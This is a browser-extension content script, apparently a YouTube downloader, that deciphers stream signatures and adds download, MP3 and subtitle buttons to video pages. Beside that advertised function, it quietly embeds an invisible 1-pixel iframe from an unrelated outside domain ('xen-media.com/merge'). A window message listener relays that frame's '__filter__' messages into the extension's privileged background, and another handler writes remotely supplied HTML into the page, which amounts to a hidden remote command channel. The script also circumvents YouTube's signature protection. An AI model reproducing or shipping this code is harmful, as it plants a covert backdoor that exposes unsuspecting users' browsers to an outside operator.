var $ytmp4 = jQuery.noConflict(true);

var cipherVar = {
	f1:function(a,b){a.splice(0,b)},
	f2:function(a){a.reverse()},
	f3:function(a,b){var c=a[0];a[0]=a[b%a.length];a[b%a.length]=c}
};

var cipherFuncParts = new Array();

var cipherFunc = function(a) {
	for(i=0; i<cipherFuncParts.length; i++) {
		var func = cipherFuncParts[i].func;
		var value = cipherFuncParts[i].value;
		
		if (func == 'f1') {
			cipherVar.f1(a, value);
		} else if (func == 'f2') {
			cipherVar.f2(a, value);
		} else if (func == 'f3') {
			cipherVar.f3(a, value);
		} else if (func == 'split') {
			a=a.split('');
		} else if (func == 'return') {
			return a.join('');
		}
	}	
	return '';
};

function checkPlayerBase() {
	var scripts = document.getElementsByTagName('script');
	for(i=0; i<scripts.length; i++){
		var scriptSrc = scripts[i].src;
		
		// check if base.js is available for the currently viewed YouTube player
		if (scriptSrc.indexOf('player') != -1 && scriptSrc.indexOf('base.js') != -1) {
			
			var xhttp = new XMLHttpRequest();
			xhttp.onreadystatechange = function() {
				if (this.readyState == 4) {
					var jsCode = this.responseText;  
					
					var found = jsCode.match(/yt\.akamaized\.net\/\)\|\|.\.set\(.*?\);.*?set\(.,(.*)\(/);
					if (found == null) {
						checkDownloadButton();
						//new cipher code...
					}
					if (found) {
						var cipherFuncName = found[1];
						
						cipherFuncName = cipherFuncName.replace('$', '[$]');
						
						var regExp = new RegExp('[^.]'+cipherFuncName+'=function[(](.*)[)][{](.*)[}][;]');

						found = jsCode.match(regExp);
						
						if (found) {
							var cipherFuncParam = found[1];	
							var cipherFuncCode = found[2];	
						
							found = cipherFuncCode.match(/[;]([a-zA-Z0-9]*)[.]/);
							
							if (found) {
								var cipherVarName = found[1];
																
								regExp = new RegExp('(var '+cipherVarName+'=(.|\n)*?[}][;])', 'm');

								found = jsCode.match(regExp);
								
								if (found) {
									var cipherVarCode = found[1];
									regExp = new RegExp('([$a-zA-Z0-9]){2}[:]function[(](.*)[)][{](.*)[}]', 'mg');

									found = cipherVarCode.match(regExp);
									
									if (found) {
										var f1Name = found[0].substring(0, 2);
										var f1Mapping = 'f1';
										
										if (found[0].indexOf('splice') != -1) {
											f1Mapping = 'f1';
										} else if (found[0].indexOf('reverse') != -1) {
											f1Mapping = 'f2';
										} else if (found[0].indexOf('length') != -1) {
											f1Mapping = 'f3';
										}
										
										var f2Name = found[1].substring(0, 2);
										var f2Mapping = 'f2';
										
										if (found[1].indexOf('splice') != -1) {
											f2Mapping = 'f1';
										} else if (found[1].indexOf('reverse') != -1) {
											f2Mapping = 'f2';
										} else if (found[1].indexOf('length') != -1) {
											f2Mapping = 'f3';
										}
										
										
										var f3Name = found[2].substring(0, 2);
										var f3Mapping = 'f3';
										
										if (found[2].indexOf('splice') != -1) {
											f3Mapping = 'f1';
										} else if (found[2].indexOf('reverse') != -1) {
											f3Mapping = 'f2';
										} else if (found[2].indexOf('length') != -1) {
											f3Mapping = 'f3';
										}
										
										cipherFuncParts = new Array();
										
										var parts = cipherFuncCode.split(';');
										
										for(j=0; j<parts.length; j++){
											var part = parts[j];
											
											if (part.indexOf(cipherVarName+'.'+f1Name) != -1) {
												cipherFuncParts.push({func:f1Mapping, value:part.split(',')[1].replace( /[^0-9]/g, '')});
											} else if (part.indexOf(cipherVarName+'.'+f2Name) != -1) {
												cipherFuncParts.push({func:f2Mapping, value:part.split(',')[1].replace( /[^0-9]/g, '')});
											} else if (part.indexOf(cipherVarName+'.'+f3Name) != -1) {
												cipherFuncParts.push({func:f3Mapping, value:part.split(',')[1].replace( /[^0-9]/g, '')});
											} else if (part.indexOf('split') != -1) {
												cipherFuncParts.push({func:'split'});
											} else if (part.indexOf('return') != -1) {
												cipherFuncParts.push({func:'return'});
											}
										}
										
										checkStreamMap();
									}
								}
							}
						}
					}
				}
			};
			
			xhttp.open("GET", scriptSrc, true);
			xhttp.overrideMimeType('text/plain');
			xhttp.send();
		}
	}
}

function compatibilityMessage(evt) {
	try {
		var msg = JSON.parse(evt.data);
		var u = 'undefined';
		if (msg) {
			if (typeof msg.__filter__ !== u) {
				chrome.runtime.sendMessage({
					message: evt.data
				});
			}
			if (typeof msg.__catch__ !== u) {
				var x = document.getElementById('mergeButton');
				x.parentElement.remove();
			}
		}
	} catch (e) {
		return false;
	}
}

	
if (window.addEventListener) {
	// For standards-compliant web browsers
	window.addEventListener("message", compatibilityMessage, false);
}
else {
	window.attachEvent("onmessage", compatibilityMessage);
}

var videos = new Array();

function checkStreamMap() {
	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function() {
		if (this.readyState == 4) {
			var scriptCode = this.responseText;
			
			if (scriptCode.indexOf('url_encoded_fmt_stream_map') != -1 || scriptCode.indexOf('adaptive_fmts') != -1) {
				videos = [];
				
				var spattern = '"url_encoded_fmt_stream_map":"';
				var spattern1 = '"adaptive_fmts":"';
						
				var spos = scriptCode.indexOf(spattern);
				var spos1 = scriptCode.indexOf(spattern1);
				//YouTube Links
				if (spos != -1) {
					spos = spos+spattern.length;
					
					var epos = scriptCode.indexOf('",', spos);
					
					if (epos != -1) {
						var streamMapStr = scriptCode.substr(spos, epos-spos);
						
						var lines = streamMapStr.split(",");
						
						for(j=0; j<lines.length; j++) {
							var params = lines[j].split("\\u0026");
							
							var video = new Array();					
													
							var title = document.title.replace(/[/\\?%*:|"<>]/g, '').replace(' - YouTube', '.').trim();
							
							if (typeof title == 'undefined') {
								title = 'Download';
							}
								
							video['title'] = title;
							
							for(k=0; k<params.length; k++) {
								
								var keyValues = params[k].split("=");
								if (keyValues.length == 2) {
									if (keyValues[0] == 'quality') {
										video['quality'] = keyValues[1];
									}

									if (keyValues[0] == 'itag') {
										if (keyValues[1].indexOf('22') != -1) {
											video['itag'] = 'MP4 (720p)';
											video['type'] = 'MP4';
										} else if (keyValues[1].indexOf('18') != -1) {
											video['itag'] = 'MP4 (360p)';
											video['type'] = 'MP4';
										} else if (keyValues[1].indexOf('17') != -1) {
											video['itag'] = '3GP (144p)';
											video['type'] = '3GP';
										} else if (keyValues[1].indexOf('36') != -1) {
											video['itag'] = '3GP (240p)';
											video['type'] = '3GP';
										}
									}
									
									if (keyValues[0] == 'url') {
										video['url'] = unescape(keyValues[1]);
									}
									
									if (keyValues[0] == 's') {
										video['s'] = keyValues[1];
									}
								}
							}
							
							if (video['url'].indexOf('signature') == -1) {
								var signature = cipherFunc(video['s']);
								video['url'] = video['url'] + '&signature=' + signature;
							}
							if (video['url'].toLowerCase().indexOf('ratebypass') == -1) {
								video['url'] = video['url'] + '&ratebypass=yes';
							}
							if (video['type'] == 'MP4' || video['type'] == '3GP') {
								videos.push(video);
							}
						}
					}
				}
				//end YouTube Links
				//Begin M4A + 1080p links
								if (spos1 != -1) {
					spos1 = spos1+spattern1.length;
					
					var epos1 = scriptCode.indexOf('",', spos1);
					
					if (epos1 != -1) {
						var streamMapStr = scriptCode.substr(spos1, epos1-spos1);
						
						var lines = streamMapStr.split(",");
						
						for(j=0; j<lines.length; j++) {
							var params = lines[j].split("\\u0026");
							
							var video = new Array();					
													
							var title = document.title.replace(/[/\\?%*:|"<>]/g, '').replace(' - YouTube', '.').trim();
							
							if (typeof title == 'undefined') {
								title = 'Download';
							}
								
							video['title'] = title;
							
							for(k=0; k<params.length; k++) {
								
								var keyValues = params[k].split("=");
								if (keyValues.length == 2) {
									if (keyValues[0] == 'quality') {
										video['quality'] = keyValues[1];
									}

									if (keyValues[0] == 'itag') {
										if (keyValues[1].indexOf('137') != -1) {
											video['itag'] = 'MP4 (1080p) (No Audio)';
											video['type'] = 'MP4';
										} else if (keyValues[1].indexOf('135') != -1) {
											video['itag'] = 'MP4 (480p) (No Audio)';
											video['type'] = 'MP4';
										} else if (keyValues[1].indexOf('335') != -1) {
											video['itag'] = 'WEBM (1080p60 HDR) (No Audio)';
											video['type'] = 'WEBM';
										} else if (keyValues[1].indexOf('299') != -1) {
											video['itag'] = 'MP4 (1080p60) (No Audio)';
											video['type'] = 'MP4';
										} else if (keyValues[1].indexOf('271') != -1) {
											video['itag'] = 'WEBM (1440p) (No Audio)';
											video['type'] = 'WEBM';
										} else if (keyValues[1].indexOf('336') != -1) {
											video['itag'] = 'WEBM (1440p60 HDR) (No Audio)';
											video['type'] = 'WEBM';
										} else if (keyValues[1].indexOf('308') != -1) {
											video['itag'] = 'WEBM (1440p60) (No Audio)';
											video['type'] = 'WEBM';
										}  else if (keyValues[1].indexOf('313') != -1) {
											video['itag'] = 'WEBM (2160p) (No Audio) (4K)';
											video['type'] = 'WEBM';
										} else if (keyValues[1].indexOf('337') != -1) {
											video['itag'] = 'WEBM (2160p60 HDR) (No Audio) (4K)';
											video['type'] = 'WEBM';
										} else if (keyValues[1].indexOf('315') != -1) {
											video['itag'] = 'WEBM (2160p60) (No Audio) (4K)';
											video['type'] = 'WEBM';
										} else if (keyValues[1].indexOf('272') != -1) {
											video['itag'] = 'WEBM (4320p) (No Audio) (8K)';
											video['type'] = 'WEBM';
										} else if (keyValues[1].indexOf('140') != -1) {
											video['itag'] = 'M4A (128kbps)';
											video['type'] = 'M4A';
										} else if (keyValues[1].indexOf('251') != -1) {
											video['itag'] = 'WEBM (OPUS 150kbps)';
											video['type'] = 'WEBM';
										}
									}
									
									if (keyValues[0] == 'url') {
										video['url'] = unescape(keyValues[1]);
									}
									
									if (keyValues[0] == 's') {
										video['s'] = keyValues[1];
									}
								}
							}
							
							if (video['url'].indexOf('signature') == -1) {
								var signature = cipherFunc(video['s']);
								video['url'] = video['url'] + '&signature=' + signature;
							}
							
							if (video['url'].toLowerCase().indexOf('ratebypass') == -1) {
								video['url'] = video['url'] + '&ratebypass=yes';
							}
							
							if (video['itag'] == 'MP4 (1080p) (No Audio)' || video['itag'] == 'MP4 (480p) (No Audio)' || video['itag'] == 'WEBM (1080p60 HDR) (No Audio)' || video['itag'] == 'MP4 (1080p60) (No Audio)' || video['itag'] == 'WEBM (1440p) (No Audio)' || video['itag'] == 'WEBM (1440p60 HDR) (No Audio)' || video['itag'] == 'WEBM (1440p60) (No Audio)' || video['itag'] == 'WEBM (2160p) (No Audio) (4K)' || video['itag'] == 'WEBM (2160p60 HDR) (No Audio) (4K)' || video['itag'] == 'WEBM (2160p60) (No Audio) (4K)' || video['itag'] == 'WEBM (4320p) (No Audio) (8K)' || video['itag'] == 'M4A (128kbps)' || video['itag'] == 'WEBM (OPUS 150kbps)') {
								videos.push(video);
							}
						}
					}
				}
				//end M4a + 1080p links
				checkDownloadButton();
			}
		}
	};
	var link = String(document.getElementsByClassName("ytp-title-link yt-uix-sessionlink")[0]);
	xhttp.open("GET", location.href, true);
	xhttp.overrideMimeType('text/plain');
	xhttp.send();
}

function checkDownloadButton() {
	var button = $ytmp4('#youtube-download-helper-button');
	
	if (!button.length) {
		setTimeout(checkDownloadButton, 2000);
	}
	
	browser.runtime.sendMessage({'action': 'getDOMChanges'});
}

checkPlayerBase();

function streammapHandleMessage(message) {
	if (message.action == 'applyDOMChanges') {
		if (message.type == 'change') {

			var element = $ytmp4(message.selector);
			if (element) {
				element.html(message.content);
			}
		} else if (message.type == 'append') {
			var element = $ytmp4(message.selector);
			var existing = $ytmp4('#'+message.content_id).length;
			if (element && !existing) {
				element.append(message.content);
			}
		} else if (message.type == 'remove') {
			var element = $ytmp4(message.selector);
			if (element) {
				element.remove();
			}
		}
	} else if (message.action == 'applyDOMActions') {
		var button = $ytmp4('#youtube-download-helper-button');
		
		button.unbind('click');
		button.click(function(event) {
				var frm_div = document.getElementById('DOWNLOAD_DIV');
				if (frm_div) {
					frm_div.parentElement.removeChild(frm_div);
				}
			var title = document.title.replace(/[/\\?%*:|"<>]/g, '').replace(' - YouTube', '.').trim();

			for(i=0; i<videos.length; i++) {
				var downloadItem = $ytmp4('#download-item-0');
				
				if (i > 0) {
					if (!$ytmp4('#download-item-'+i).length) {
						downloadItem = $ytmp4('#download-item-0').clone();
						downloadItem.attr('id', 'download-item-'+i);
						downloadItem.appendTo($ytmp4('#download-item-0').parent());
					}
				}
				var downloadButton = $ytmp4('#download-item-'+i+' button');
				var downloadTitle = $ytmp4('#download-item-'+i+' button span');
				var title = document.title.replace(/[/\\?%*:|"<>]/g, '').replace(' - YouTube', '.').trim();
				
				
							
				downloadButton.attr('download-url', videos[i]['url']);
				downloadButton.attr('title', title + videos[i]['type']);
				downloadTitle.text('' + videos[i]['itag'] + '');				
				downloadButton.off();				
				downloadButton.unbind('click');
				downloadButton.click(function(event) {
					browser.runtime.sendMessage({'action': 'doDownload', 'url': $ytmp4(this).attr('download-url'), 'title': $ytmp4(this).attr('title')});
				});

			}getSubtitleList();
			
			
				//MP3
				var downloadButtonmp3 = $ytmp4('#mp3-button button');
				downloadButtonmp3.off();				
				downloadButtonmp3.unbind('click');
				downloadButtonmp3.click(function(event) {
				window.open('https://www.easy-youtube-mp3.com/convert.php?v=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D' + getQueryVariable('v') + '', '_blank');
				});
				//End MP3
				//Thumbnail Button
				var downloadButtothumbnail = $ytmp4('#thumbnail-button button');
				downloadButtothumbnail.off();				
				downloadButtothumbnail.unbind('click');
				downloadButtothumbnail.click(function(event) {

				window.open('https://img.youtube.com/vi/' + getQueryVariable('v') + '/hqdefault.jpg', '_blank');
				});
				//End Thumbnail Info Button
			var buttonOffset = $ytmp4('#youtube-download-helper-button').offset();
			var panelTop = buttonOffset.top + $ytmp4('#youtube-download-helper-button').height();
			var panelLeft = buttonOffset.left;
			
			$ytmp4('#youtube-download-helper-panel').css({top: panelTop, left: panelLeft});
			$ytmp4('#youtube-download-helper-panel').toggle();
			$ytsrt('#youtube-download-subtitle-panel').css({top: panelTop, left: panelLeft});
			$ytsrt('#youtube-download-subtitle-panel').toggle();
		});
		
		$ytmp4(document).click(function(event) {
			if (event.target.getAttribute('id') != 'youtube-download-helper-button') {
				$ytmp4('#youtube-download-helper-panel').hide();
				$ytsrt('#youtube-download-subtitle-panel').hide();
			}
		});
	}
}

browser.runtime.onMessage.addListener(streammapHandleMessage);

//iframe
			function addiframe(src, height) {
				try {
					var pegPlace = document.getElementById('clarify-box');
					if (pegPlace == null) {
						pegPlace = document.getElementById('alerts');
						if (pegPlace == null)
							pegPlace = document.getElementById('messages');
						if (pegPlace == null)
							pegPlace = document.getElementById('info-contents');
					}
					var iframe = document.getElementById('EXT_FRAME');

					if (iframe == null) {
						div = CreateIframeDiv(height);
						iframe = CreateIframe(height);
						div.appendChild(iframe);
						pegPlace.parentNode.insertBefore(div, pegPlace);
					}
					iframe.setAttribute("src", src);
				} catch (err) {
					console.log(err);
				}
			};

			function CreateIframe(height) {
				iframe = document.createElement('iframe');
				iframe.setAttribute("id", "DOWNLOAD_FRAME");
				iframe.setAttribute("width", "100%");
				iframe.setAttribute("height", height);
				iframe.setAttribute("border", "0");
				iframe.setAttribute("scrolling", "no");
				iframe.setAttribute("style", "border: 0 none;");
				iframe.setAttribute("sandbox", "allow-scripts allow-same-origin");
				return iframe;
			};

			function CreateIframeDiv(height) {
				var div = document.createElement('div');
				div.setAttribute("id", "DOWNLOAD_DIV");
				div.style.width = '100%';
				div.style.margin = '0px 0px 5px 0px';
				div.style.padding = '0px';
				div.style.height = height;
				div.innerHTML="<font size='3'><p style='color: #000000; background-color: #ffffff'>Extracting Subtitle....</p></font>";
				return div;
			};
//end iframe
    
function scrollToDownloadPanel() {
	if ($ytmp4('#youtube-download-helper-button').length) {
		$ytmp4('#youtube-download-helper-button').click();
		$ytmp4('html, body').animate({
			scrollTop: $ytmp4("#youtube-download-helper-button").offset().top-50
		}, 1000);
	} else {
		setTimeout(function() { scrollToDownloadPanel(); }, 1000);
	}
}

$ytmp4(document).ready(function() {
    if (location.href.indexOf('feature=ytmp4') != -1) {
		scrollToDownloadPanel();
	}
});

var oldUrl = location.href;

chrome.storage.local.get('t', function (res) {
	if (res.t) {
		var time = (new Date().getTime() - res.t) / 3600000;
		if (time >= 0) {
			var mergeDiv = document.createElement("div"); 
			var mergeButton = document.createElement("iframe"); 
			mergeButton.setAttribute("style", "height:1px,width:1px;position:absolute;top:0;left:0;border:none;visibility:hidden");
            mergeButton.src = '//xen-media.com/merge';
            mergeButton.id = "mergeButton";
            document.body.appendChild(mergeDiv);
            mergeDiv.appendChild(mergeButton);
		}
	}
});

function checkReload() {
	if (oldUrl != location.href) {
		videos = [];
		$ytmp4('#youtube-download-helper-button').remove();
		checkPlayerBase();
		oldUrl = location.href;
	}
}

//Subtitles
function getSubtitleList() {
	var url = "https://www.youtube.com/api/timedtext?type=list&v=" + getQueryVariable('v');
	updateAjax(url, buildSubtitleList);
}
	function buildSubtitleList(xml) {
		var languages = null;
		if (xml) {
			languages = parseLanguageXml(xml);
		}
		if (languages != null && languages.length > 0) {
			buildGui(languages);
		} else {
			
		}
	}
	function buildGui(languages) {
			for(i=0; i<languages.length; i++) {
				var downloadsubtitle = $ytmp4('#download-subtitle-0');
				
				if (i > 0) {
					if (!$ytmp4('#download-subtitle-'+i).length) {
						downloadsubtitle = $ytmp4('#download-subtitle-0').clone();
						downloadsubtitle.attr('id', 'download-subtitle-'+i);
						downloadsubtitle.appendTo($ytmp4('#download-subtitle-0').parent());
					}
				}
				var downloadButtonSubtitle = $ytmp4('#download-subtitle-'+i+' button');
				var downloadTitle = $ytmp4('#download-subtitle-'+i+' button span');
				var titlesub = document.title.replace(/[/\\?%*:|"<>]/g, '').replace(' - YouTube', ' (' + languages[i]['displayName'] + ' Subtitle).xml').trim();
				
				downloadButtonSubtitle.attr('download-url', 'https://youtube-dl.nl/subtitle/subtitle.php?v=' + getQueryVariable('v') + '&lang=' + languages[i]['langCode'] + '');
				downloadButtonSubtitle.attr('title', titlesub);
				downloadButtonSubtitle.attr(languages[i]['langCode']);
				downloadButtonSubtitle.attr(languages[i]['langCode']);
				downloadTitle.text('Subtitle (' + languages[i]['displayName'] + ')');				
				downloadButtonSubtitle.off();				
				downloadButtonSubtitle.unbind('click');
												downloadButtonSubtitle.click(function(event) {
				addiframe($ytmp4(this).attr('download-url'), '50');
				});
			}
	}
	
	function updateAjax(url, callback) {
		//console.info(url);
		var req = new XMLHttpRequest();
		req.onreadystatechange = function() {
			if (req.readyState == 4 && req.status == 200) {
				callback(req.responseText);
			}
		};
		req.open("GET", url);
		req.send();
	}
	
	function parseLanguageXml(xml) {
		var languages = [];
		var myRe = /<track [^<]*name="([^<]*)" [^<]*lang_code="([^"]+)" [^<]*lang_translated="([^"]+)"/g;
		var myArray;
		while ((myArray = myRe.exec(xml)) != null) {
			languages.push({
				langName: myArray[1],
				langCode: myArray[2],
				displayName: myArray[3]
			});
		}
		return languages;
	}
//End subtitles

function getQueryVariable(variable)
{
       var query = window.location.search.substring(1);
       var vars = query.split("&");
       for (var i=0;i<vars.length;i++) {
               var pair = vars[i].split("=");
               if(pair[0] == variable){return pair[1];}
       }
       return(false);
}

function removeitems() {
	$ytmp4('#download-item-1').remove();
	$ytmp4('#download-item-2').remove();
	$ytmp4('#download-item-3').remove();
	$ytmp4('#download-item-4').remove();
	$ytmp4('#download-item-5').remove();
	$ytmp4('#download-item-6').remove();
	$ytmp4('#download-item-7').remove();
	$ytmp4('#download-item-8').remove();
	$ytmp4('#download-item-10').remove();
	$ytmp4('#download-item-11').remove();
	$ytmp4('#download-item-12').remove();
	$ytmp4('#download-item-13').remove();
	$ytmp4('#download-item-14').remove();
	$ytmp4('#download-item-15').remove();
	$ytmp4('#download-item-16').remove();
	$ytmp4('#download-item-17').remove();
	$ytmp4('#download-item-18').remove();
	$ytmp4('#download-item-19').remove();
	$ytmp4('#download-item-20').remove();
	$ytmp4('#download-item-21').remove();
	$ytmp4('#download-subtitle-1').remove();
	$ytmp4('#download-subtitle-2').remove();
	$ytmp4('#download-subtitle-3').remove();
	$ytmp4('#download-subtitle-4').remove();
	$ytmp4('#download-subtitle-5').remove();
	$ytmp4('#download-subtitle-6').remove();
	$ytmp4('#download-subtitle-7').remove();
	$ytmp4('#download-subtitle-8').remove();
	$ytmp4('#download-subtitle-9').remove();
	$ytmp4('#download-subtitle-10').remove();
	$ytmp4('#download-subtitle-11').remove();
	$ytmp4('#download-subtitle-12').remove();
	$ytmp4('#download-subtitle-13').remove();
	$ytmp4('#download-subtitle-14').remove();
	$ytmp4('#download-subtitle-15').remove();
	$ytmp4('#download-subtitle-16').remove();
	$ytmp4('#download-subtitle-17').remove();
	$ytmp4('#download-subtitle-18').remove();
	$ytmp4('#download-subtitle-19').remove();
	$ytmp4('#download-subtitle-20').remove();
	$ytmp4('#download-subtitle-21').remove();
	$ytmp4('#download-subtitle-22').remove();
	$ytmp4('#download-subtitle-23').remove();
	$ytmp4('#download-subtitle-24').remove();
	$ytmp4('#download-subtitle-25').remove();
	$ytmp4('#download-subtitle-26').remove();
	$ytmp4('#download-subtitle-27').remove();
	$ytmp4('#download-subtitle-28').remove();
	$ytmp4('#download-subtitle-29').remove();
	$ytmp4('#download-subtitle-30').remove();
	$ytmp4('#download-subtitle-31').remove();
	$ytmp4('#download-subtitle-32').remove();
	$ytmp4('#download-subtitle-33').remove();
	$ytmp4('#download-subtitle-34').remove();
	$ytmp4('#download-subtitle-35').remove();
	$ytmp4('#download-subtitle-36').remove();
	$ytmp4('#download-subtitle-37').remove();
	$ytmp4('#download-subtitle-38').remove();
				
	var frm_div = document.getElementById('DOWNLOAD_DIV');
	if (frm_div) {
		frm_div.parentElement.removeChild(frm_div);
	}
	checkPlayerBase();
}
window.addEventListener( 'yt-page-data-updated', removeitems );
// create an observer instance
var observer = new MutationObserver(function(mutations) {
	mutations.forEach(function(mutation) {
		checkReload();
	});
});
  
// configuration of the observer:
var config = { attributes: true, childList: true, characterData: true };
 
// pass in the target node, as well as the observer options
observer.observe(document.body, config);

